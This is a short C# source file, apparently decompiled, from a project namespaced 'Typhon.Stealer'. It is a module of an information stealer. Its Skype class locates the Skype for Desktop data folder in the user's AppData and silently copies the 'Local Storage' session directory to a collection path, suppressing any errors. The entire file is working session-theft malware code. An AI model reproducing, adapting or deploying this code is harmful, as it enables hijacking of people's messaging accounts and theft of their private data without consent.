using System;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x0200001A RID: 26
	internal class Skype
	{
		// Token: 0x0600006F RID: 111 RVA: 0x00004FE4 File Offset: 0x000031E4
		public static void GetSession(string sSavePath)
		{
			if (!Directory.Exists(Skype.SkypePath))
			{
				return;
			}
			string text = Path.Combine(Skype.SkypePath, "Local Storage");
			if (Directory.Exists(text))
			{
				try
				{
					IOHelper.CopyDirectory(text, sSavePath + "\\Local Storage");
				}
				catch
				{
				}
			}
		}

		// Token: 0x0400003C RID: 60
		private static readonly string SkypePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Skype for Desktop");
	}
}
